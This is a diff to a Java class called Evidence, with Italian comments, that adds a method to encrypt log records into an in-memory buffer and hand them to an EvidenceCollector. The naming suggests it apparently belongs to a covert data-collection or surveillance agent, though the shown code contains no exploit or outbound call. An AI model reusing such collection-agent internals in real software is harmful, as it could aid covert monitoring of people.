@@ -245,6 +245,8 @@ public final class Evidence {
         return createEvidence(additionalData, false);
     }
 
+
+    
     /**
      * Questa funzione crea un file di log e lascia l'handle aperto. Il file
      * viene creato con un nome casuale, la chiamata scrive l'header nel file e
@@ -302,6 +304,7 @@ public final class Evidence {
         final String encName = (String) tuple.elementAt(3);
         final String plainFileName = (String) tuple.elementAt(4);
 
+        
         final String dir = basePath + blockDir + "/";
         final boolean ret = Path.createDirectory(dir, true);
 
@@ -384,7 +387,7 @@ public final class Evidence {
         return true;
     }
 
-    private boolean enoughSpace() {
+    public static boolean enoughSpace() {
         long free = 0;
         free = Path.freeSpace(Path.USER);
 
@@ -644,15 +647,61 @@ public final class Evidence {
     public static void info(final String message, boolean force) {
         try {
             final Evidence logInfo = new Evidence(EvidenceType.INFO);
-            logInfo.createEvidence(null, force);
-            logInfo.writeEvidence(WChar.getBytes(message, true));
-            logInfo.close();
 
+            byte[] memory = logInfo.atomicWriteMemory(null ,WChar.getBytes(message, true));
+            EvidenceCollector logCollector = EvidenceCollector.getInstance();
+            logCollector.appendMemoryEvidence(memory);
+           
         } catch (final Exception ex) {
             //#ifdef DEBUG
             debug.error(ex);
             //#endif
         }
+    }
+    
+    public synchronized byte[] atomicWriteMemory(final byte[] additionalData,  byte[] content) {
+        //#ifdef DEBUG
+        debug.trace("createLog evidenceType: " + typeEvidenceId);
+        //#endif
+
+        timestamp = new Date();
+
+        int additionalLen = 0;
+
+        if (additionalData != null) {
+            additionalLen = additionalData.length;
+        }
+
+        final byte[] plainBuffer = makeDescription(additionalData,
+                typeEvidenceId);
+        //#ifdef DBC
+        Check.asserts(plainBuffer.length >= 32 + additionalLen,
+                "Short plainBuffer");
+        //#endif
+
+
+        final byte[] encAdditional = encryption.encryptData(plainBuffer);
+        //#ifdef DBC
+        Check.asserts(encAdditional.length == Encryption
+                .getNextMultiple(plainBuffer.length), "Wrong encBuffer");
+        //#endif
+
+        encData = encryption.encryptData(content, 0);
+        //#ifdef DEBUG
+        debug.trace("writeEvidence encdata: " + encData.length);
+        //#endif
+        
+        byte[] buffer = new byte[plainBuffer.length + encData.length + 8];
+        
+        // scriviamo la dimensione dell'header paddato
+        Utils.copy(buffer, Utils.intToByteArray(plainBuffer.length), 4);
+        // scrittura dell'header cifrato
+        Utils.copy(buffer, 4, encAdditional, 0, encAdditional.length);
+        
+        Utils.copy(buffer, encAdditional.length + 4,  Utils.intToByteArray(content.length), 0, 4);
+        Utils.copy(buffer, encAdditional.length + 8, encData, 0, encData.length);
+
+        return buffer;
     }
 
     public synchronized void atomicWriteOnce(byte[] additionalData,
